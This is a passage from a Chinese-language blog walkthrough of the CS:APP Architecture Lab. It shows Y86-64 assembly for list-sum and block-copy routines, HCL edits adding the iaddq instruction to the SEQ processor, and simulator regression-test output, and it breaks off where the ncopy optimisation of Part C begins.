class="hljs-keyword">return</span>               <span class="hljs-comment"># if(!ls)</span><br>        mrmov<span class="hljs-string">q (%rdi)</span>, %rbx     <span class="hljs-comment"># val = ls-&gt;val</span><br>        mrmovq <span class="hljs-number">8</span>(%rdi), %rdi    <span class="hljs-comment"># ls = ls-&gt;next</span><br>        pushq %rbx<br>        call rsum_list          <span class="hljs-comment"># rsum_list(ls-&gt;next)</span><br>        popq %rbx<br>        addq %rbx, %rax         <span class="hljs-comment"># val + rest</span><br>        ret<br><span class="hljs-keyword">return</span>:<br>        irmovq $0, %rax<br>        ret<br><br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>        .pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><p>测试结果如下</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202309101512757.png" alt="rsum.yo"></p><p>rax寄存器显示0xcba，结果正确。</p><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p>要求数组各元素的按位异或值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* copy_block - Copy src to dest and return xor checksum of src */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">copy_block</span><span class="hljs-params">(<span class="hljs-type">long</span> *src, <span class="hljs-type">long</span> *dest, <span class="hljs-type">long</span> len)</span><br>&#123;<br>    <span class="hljs-type">long</span> result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-type">long</span> val = *src++;<br>*dest++ = val;<br>result ^= val;<br>len--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs perl">/* copy_block - Copy src to dest <span class="hljs-keyword">and</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">xor</span> checksum of src */<br><span class="hljs-comment"># Execution begins at address 0</span><br>        .pos <span class="hljs-number">0</span><br>        irmovq stack, %rsp      <span class="hljs-comment"># Set up stack pointer</span><br>        call main               <span class="hljs-comment"># Execute main program</span><br>        halt                    <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample</span><br>        .align <span class="hljs-number">8</span><br><span class="hljs-comment"># Source block</span><br>src:<br>        .quad <span class="hljs-number">0x00a</span><br>        .quad <span class="hljs-number">0x0b0</span><br>        .quad <span class="hljs-number">0xc00</span><br><br><span class="hljs-comment"># Destination block</span><br>dest:<br>        .quad <span class="hljs-number">0x111</span><br>        .quad <span class="hljs-number">0x222</span><br>        .quad <span class="hljs-number">0x333</span><br><br>main:<br>        irmovq src, %rdi        <span class="hljs-comment"># src</span><br>        irmovq dest, %rsi       <span class="hljs-comment"># dest</span><br>        irmovq $3, %rdx         <span class="hljs-comment"># len</span><br>        call copy_block<br>        ret<br><br><span class="hljs-comment"># long copy_block(long *src, long *dest, long len)</span><br><span class="hljs-comment"># src in %rdi</span><br><span class="hljs-comment"># dest in %rsi</span><br><span class="hljs-comment"># len in %rdx</span><br>copy_block:<br>        irmovq $8, %r8<br>        irmovq $1, %r9<br>        irmovq $0, %rax<br>        andq %rdx, %rdx<br>        jmp test<br>loop:<br>        mrmov<span class="hljs-string">q (%rdi)</span>, %r10     <span class="hljs-comment"># val = *src1</span><br>        addq %r8, %rdi          <span class="hljs-comment"># src++</span><br>        rmmovq %r10, (%rsi)     <span class="hljs-comment"># *dest = val</span><br>        addq %r8, %rsi          <span class="hljs-comment"># dest++</span><br>        xorq %r10, %rax         <span class="hljs-comment"># result ^= val</span><br>        subq %r9, %rdx          <span class="hljs-comment"># len--.  Set CC</span><br>test:<br>        jne loop                <span class="hljs-comment"># Stop when 0</span><br>        ret<br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>        .pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202309101336261.png" alt="image-20230910133633223"></p><p>结果正确</p><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p><code>to extend the SEQ processor to support the iaddq</code>，</p><p>让处理器支持iaddq指令，修改hcl文件。</p><p>书中P264Y86-64处理器对一条指令的处理包括以下几个步骤：</p><ul><li><strong>取址：</strong>根据 PC 的值从内存中读取指令字节<ul><li>指令指示符字节的两个四位部分，为<code>icode:ifun</code></li><li>寄存器指示符字节，为 <code>rA</code>, <code>rB</code></li><li>8字节常数字，为 <code>valC</code></li><li>计算下一条指令地址，为 <code>valP</code></li></ul></li><li><strong>译码：</strong>从寄存器读入最多两个操作数<ul><li>由 <code>rA</code>, <code>rB</code> 指明的寄存器，读为 <code>valA</code>, <code>valB</code></li><li>对于指令<code>popq</code>, <code>pushq</code>, <code>call</code>, <code>ret</code>也可能从<code>%rsp</code>中读</li></ul></li><li><strong>执行：</strong>根据<code>ifun</code>计算，或计算内存引用的有效地址，或增加或减少栈指针<ul><li>对上述三者之一进行的操作得到的值为<code>valE</code></li><li>如果是计算，则设置条件码</li><li>对于条件传送指令，检验条件码和传送条件，并据此更新目标寄存器</li><li>对于跳转指令，决定是否选择分支</li></ul></li><li><strong>访存：</strong>输入写入内存或从内存读出数据<ul><li>若是从内存中读出数据，则读出的值为<code>valM</code></li></ul></li><li><strong>写回：</strong>最多写两个结果到寄存器</li><li><strong>更新 PC：</strong>将 PC 设置成下一条指令的地址</li></ul><p> 其执行过程与<code>OPq</code>和<code>irmovq</code>类似，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">指令为：iaddq V, rB<br>取指：<br>    icode:ifun &lt;- M_1[PC]<br>    rA:rB &lt;- M_1[PC+<span class="hljs-number">1</span>]<br>    valC &lt;- M_8[PC+<span class="hljs-number">2</span>]<br>    valP &lt;- PC+<span class="hljs-number">10</span><br><br>译码：<br>    valB &lt;- R[rB]<br><br>执行：<br>    valE &lt;-  valB + valC<br>    Set CC<br><br>访存：<br><br>写回：<br>    R[rB] &lt;- valE<br><br>更新PC：<br>    PC &lt;- valP<br></code></pre></td></tr></table></figure><p>根据上述代码修改hcl文件，</p><p>其中取值阶段i<code>nstr_valid</code> <code>need_regids</code> <code>need_valC</code>需要加上<code>iiaddq</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool instr_valid</span> = icode in <br>    &#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,<br>           IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;<br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool need_regids</span> =<br>    icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, <br>             IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;<br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool need_valC</span> =<br>    icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;<br></code></pre></td></tr></table></figure><p>译码和写回 <code>srcB</code>（产生<code>valB</code>）的寄存器，需要在<code>rB</code>的括号中加上<code>iiaddq</code></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">word srcB = [<br>    icode <span class="hljs-keyword">in</span> &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : <span class="hljs-type">rB</span>;<br>    icode <span class="hljs-keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : <span class="hljs-type">RRSP</span>;<br>    <span class="hljs-number">1</span> : <span class="hljs-type">RNONE</span>;  # Don<span class="hljs-symbol">&#x27;t</span> need register<br>];<br></code></pre></td></tr></table></figure><p><code>dst_E</code>表明写端口 E 的目的寄存器，计算出来的值<code>valE</code>将放在那里。最终结果要存放在<code>rB</code>中，需要在<code>rB</code>的前面加上<code>iiaddq</code></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada">word dstE = [<br>    icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ &#125; &amp;&amp; Cnd : <span class="hljs-type">rB</span>;<br>    icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IOPQ, IIADDQ &#125; : <span class="hljs-type">rB</span>;<br>    icode <span class="hljs-keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : <span class="hljs-type">RRSP</span>;<br>    <span class="hljs-number">1</span> : <span class="hljs-type">RNONE</span>;  # Don<span class="hljs-symbol">&#x27;t</span> write any register<br>];<br></code></pre></td></tr></table></figure><p>执行阶段<code>ALU</code>对<code>aluA</code>和<code>aluB</code>进行计算，<code>aluA</code>可以是<code>valA</code>、<code>valC</code> 、<code>8</code>或<code>-8</code>，<code>aluB</code>只能是<code>valB</code></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-comment">## Select input A to ALU</span><br><span class="hljs-attribute">word aluA = [</span><br><span class="hljs-attribute">    icode in &#123; IRRMOVQ, IOPQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">valA;</span><br>    <span class="hljs-attribute">icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">valC;</span><br>    <span class="hljs-attribute">icode in &#123; ICALL, IPUSHQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">-8;</span><br>    <span class="hljs-attribute">icode in &#123; IRET, IPOPQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">8;</span><br>    <span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br><span class="hljs-attribute">];</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">## Select input B to ALU</span><br><span class="hljs-attribute">word aluB = [</span><br><span class="hljs-attribute">    icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="hljs-attribute">              IPUSHQ, IRET, IPOPQ, IIADDQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">valB;</span><br>    <span class="hljs-attribute">icode in &#123; IRRMOVQ, IIRMOVQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">0;</span><br>    <span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br>];<br></code></pre></td></tr></table></figure><p>同时需要更新条件码寄存器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool set_cc</span> = icode in &#123; IOPQ,IIADDQ &#125;;<br></code></pre></td></tr></table></figure><p>iiaddq不涉及访存和转移操作，无修改访存阶段和更新PC阶段。</p><p>使用lab附的SEQ模拟器的TTY模式对HCL文件进行测试。（同时也建议大家去看看GUI模式，很惊艳</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs routeros">voidsolar@admin:~/csapp_lab/archlab-handout/sim/seq$ ./ssim -t <span class="hljs-built_in">..</span>/y86-code/asumi.yo<br>Y86-64 Processor: seq-full.hcl<br>137 bytes of code read<br><span class="hljs-keyword">IF</span>: Fetched irmovq at 0x0.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsp, valC = 0x100<br><span class="hljs-keyword">IF</span>: Fetched call at 0xa.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x38<br>Wrote 0x13 <span class="hljs-keyword">to</span><span class="hljs-built_in"> address </span>0xf8<br><span class="hljs-keyword">IF</span>: Fetched irmovq at 0x38.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x18<br><span class="hljs-keyword">IF</span>: Fetched irmovq at 0x42.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsi, valC = 0x4<br><span class="hljs-keyword">IF</span>: Fetched call at 0x4c.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x56<br>Wrote 0x55 <span class="hljs-keyword">to</span><span class="hljs-built_in"> address </span>0xf0<br><span class="hljs-keyword">IF</span>: Fetched xorq at 0x56.  <span class="hljs-attribute">ra</span>=%rax, <span class="hljs-attribute">rb</span>=%rax, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched andq at 0x58.  <span class="hljs-attribute">ra</span>=%rsi, <span class="hljs-attribute">rb</span>=%rsi, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched jmp at 0x5a.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x83<br><span class="hljs-keyword">IF</span>: Fetched jne at 0x83.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x63<br><span class="hljs-keyword">IF</span>: Fetched mrmovq at 0x63.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched addq at 0x6d.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rax, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x6f.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x8<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x79.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsi, valC = 0xffffffffffffffff<br><span class="hljs-keyword">IF</span>: Fetched jne at 0x83.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x63<br><span class="hljs-keyword">IF</span>: Fetched mrmovq at 0x63.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched addq at 0x6d.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rax, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x6f.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x8<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x79.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsi, valC = 0xffffffffffffffff<br><span class="hljs-keyword">IF</span>: Fetched jne at 0x83.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x63<br><span class="hljs-keyword">IF</span>: Fetched mrmovq at 0x63.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched addq at 0x6d.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rax, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x6f.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x8<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x79.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsi, valC = 0xffffffffffffffff<br><span class="hljs-keyword">IF</span>: Fetched jne at 0x83.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x63<br><span class="hljs-keyword">IF</span>: Fetched mrmovq at 0x63.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched addq at 0x6d.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rax, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x6f.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x8<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x79.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsi, valC = 0xffffffffffffffff<br><span class="hljs-keyword">IF</span>: Fetched jne at 0x83.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x63<br><span class="hljs-keyword">IF</span>: Fetched ret at 0x8c.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched ret at 0x55.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched halt at 0x13.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x0<br>32 instructions executed<br>Status = HLT<br>Condition Codes: <span class="hljs-attribute">Z</span>=1 <span class="hljs-attribute">S</span>=0 <span class="hljs-attribute">O</span>=0<br>Changed Register State:<br>%rax:   0x0000000000000000      0x0000abcdabcdabcd<br>%rsp:   0x0000000000000000      0x0000000000000100<br>%rdi:   0x0000000000000000      0x0000000000000038<br>%r10:   0x0000000000000000      0x0000a000a000a000<br>Changed Memory State:<br>0x00f0: 0x0000000000000000      0x0000000000000055<br>0x00f8: 0x0000000000000000      0x0000000000000013<br>ISA Check Succeeds<br></code></pre></td></tr></table></figure><h4 id="基准测试"><a href="#基准测试" class="headerlink" title="基准测试"></a>基准测试</h4><p>运行<strong>基准测试</strong>保证指令集原有指令没有被破坏</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs gradle">voidsolar@admin:~<span class="hljs-regexp">/csapp_lab/</span>archlab-handout<span class="hljs-regexp">/sim/</span>seq$ cd ../y86-code; make testssim<br>..<span class="hljs-regexp">/seq/</span>ssim -t asum.yo &gt; asum.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t asumr.yo &gt; asumr.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t cjr.yo &gt; cjr.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t j-cc.yo &gt; j-cc.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t poptest.yo &gt; poptest.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t pushquestion.yo &gt; pushquestion.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t pushtest.yo &gt; pushtest.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog1.yo &gt; prog1.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog2.yo &gt; prog2.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog3.yo &gt; prog3.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog4.yo &gt; prog4.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog5.yo &gt; prog5.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog6.yo &gt; prog6.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog7.yo &gt; prog7.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog8.yo &gt; prog8.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t ret-hazard.yo &gt; ret-hazard.seq<br><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;ISA Check&quot;</span> *.seq<br>asum.seq:ISA Check Succeeds<br>asumr.seq:ISA Check Succeeds<br>cjr.seq:ISA Check Succeeds<br>j-cc.seq:ISA Check Succeeds<br>poptest.seq:ISA Check Succeeds<br>prog1.seq:ISA Check Succeeds<br>prog2.seq:ISA Check Succeeds<br>prog3.seq:ISA Check Succeeds<br>prog4.seq:ISA Check Succeeds<br>prog5.seq:ISA Check Succeeds<br>prog6.seq:ISA Check Succeeds<br>prog7.seq:ISA Check Succeeds<br>prog8.seq:ISA Check Succeeds<br>pushquestion.seq:ISA Check Succeeds<br>pushtest.seq:ISA Check Succeeds<br>ret-hazard.seq:ISA Check Succeeds<br>rm asum.seq asumr.seq cjr.seq j-cc.seq poptest.seq pushquestion.seq pushtest.seq prog1.seq prog2.seq prog3.seq prog4.seq prog5.seq prog6.seq prog7.seq prog8.seq ret-hazard.seq<br></code></pre></td></tr></table></figure><h4 id="回归测试"><a href="#回归测试" class="headerlink" title="回归测试"></a>回归测试</h4><p>测试除了iaddq以外的指令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">voidsolar@admin:~<span class="hljs-regexp">/csapp_lab/</span>archlab-handout<span class="hljs-regexp">/sim/y</span>86-code$ cd ..<span class="hljs-regexp">/ptest; make SIM=../</span>seq/ssim<br>.<span class="hljs-regexp">/optest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">49</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/jtest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">64</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/ctest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">22</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/htest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">600</span> ISA Checks Succeed<br></code></pre></td></tr></table></figure><p>测试自己实现的iaddq</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">voidsolar@admin:~<span class="hljs-regexp">/csapp_lab/</span>archlab-handout<span class="hljs-regexp">/sim/</span>ptest$ cd ..<span class="hljs-regexp">/ptest; make SIM=../</span>seq/ssim TFLAGS=-i<br>.<span class="hljs-regexp">/optest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">58</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/jtest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">96</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/ctest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">22</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/htest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">756</span> ISA Checks Succeed<br></code></pre></td></tr></table></figure><p>至此Part B全部完成</p><h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><p>我们需要修改HCL和ncopy来优化程序，通过程序的效率计算分数</p><p>首先iaddq是一条效率很高的指令，它能够将两步化为一步。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ncopy - copy src to dst, returning number of positive ints</span><br><span class="hljs-comment"> * contained in src array.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">word_t</span> <span class="hljs-title function_">ncopy</span><span class="hljs-params">(<span class="hljs-type">word_t</span> *src, <span class="hljs-type">word_t</span> *dst, <span class="hljs-type">word_t</span> len)</span><br>&#123;<br>    <span class="hljs-type">word_t</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">word_t</span> val;<br><br>    <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br>    val = *src++;<br>    *dst++ = val;<br>    <span class="hljs-keyword">if</span> (val &gt; <span class="hljs-number">0</span>)<br>        count++;<br>    len--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>原汇编代码如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span 